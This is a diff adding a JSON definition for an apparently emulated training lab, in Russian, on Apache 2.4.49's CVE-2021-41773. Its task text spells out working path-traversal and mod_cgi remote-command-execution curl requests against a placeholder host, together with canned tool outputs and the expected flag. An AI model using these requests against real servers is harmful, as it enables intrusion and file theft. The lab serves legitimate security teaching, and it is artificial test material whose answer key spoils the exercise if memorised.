@@ -1,0 +1,37 @@
+{
+  "id": "web-server-misconfig",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{cv3_2021_41773_p4th_tr4v3rs4l}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: мисконфиг Apache (CVE-2021-41773)\n\n`app.example` отдаёт заголовок `Server: Apache/2.4.49` — это уязвимая версия\n(path traversal, а с `mod_cgi` — RCE).\n\n1. Сними версию:\n\n   curl -sI https://app.example/\n\n2. Прочитай файл вне корня (нужен `--path-as-is`, иначе curl схлопнет `..`):\n\n   curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'\n\n3. Выполни команду через тот же обход (mod_cgi) и прочитай флаг:\n\n   curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; cat /flag.txt' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.example)",
+      "cases": [
+        { "match": "flag\\.txt|cat /flag", "example": "--path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo ...; cat /flag.txt'", "output": "Content-Type: text/plain\n\nnto{cv3_2021_41773_p4th_tr4v3rs4l}\n" },
+        { "match": "bin/sh|--data", "example": "--path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo ...; id'", "output": "Content-Type: text/plain\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n" },
+        { "match": "passwd", "example": "--path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'", "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" },
+        { "match": "server-status", "example": "-s -o /dev/null -w '%{http_code}' https://app.example/server-status", "output": "<!DOCTYPE HTML><html><head><title>Apache Status</title></head><body><h1>Apache Server Status</h1>\nServer Version: Apache/2.4.49 (Unix)\n</body></html>\n" },
+        { "match": "-sI|app\\.example/ ", "example": "-sI https://app.example/", "output": "HTTP/1.1 200 OK\nServer: Apache/2.4.49 (Unix)\nContent-Type: text/html\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только app.example (версия, traversal, RCE).\n"
+    },
+    "whatweb": {
+      "help": "whatweb [-a3] <url> — фингерпринт (эмуляция app.example)",
+      "cases": [
+        { "match": "app\\.example", "example": "-a3 https://app.example", "output": "https://app.example [200 OK] Apache[2.4.49], HTTPServer[Unix][Apache/2.4.49], IP[203.0.113.10]\n" }
+      ],
+      "fallback": "whatweb: в этой лабе эмулируется только app.example.\n"
+    },
+    "nuclei": {
+      "help": "nuclei -u <url> [-tags ...] — сканер (эмуляция app.example)",
+      "cases": [
+        { "match": "app\\.example", "example": "-u https://app.example -tags apache,cve", "output": "[CVE-2021-41773] [http] [critical] https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\n[apache-server-status] [http] [low] https://app.example/server-status\n" }
+      ],
+      "fallback": "nuclei: в этой лабе эмулируется скан app.example.\n"
+    }
+  }
+}
